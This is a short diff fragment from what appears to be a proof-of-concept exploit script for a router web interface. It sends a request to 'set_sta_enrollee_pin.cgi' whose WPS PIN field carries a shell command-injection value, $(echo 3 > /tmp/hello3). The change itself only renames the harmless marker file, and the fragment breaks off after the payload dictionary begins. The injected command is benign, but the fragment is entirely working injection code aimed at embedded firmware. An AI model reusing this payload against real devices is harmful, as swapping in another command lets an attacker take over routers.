@@ -6,7 +6,7 @@ ip = "http://192.168.0.1/"
 
 url = ip + 'set_sta_enrollee_pin.cgi'
 
-command = "a'$(echo 4 > /tmp/hello4)'b"
+command = "a'$(echo 3 > /tmp/hello3)'b"
 
 payload = {
     "wps_sta_enrollee_pin": command,
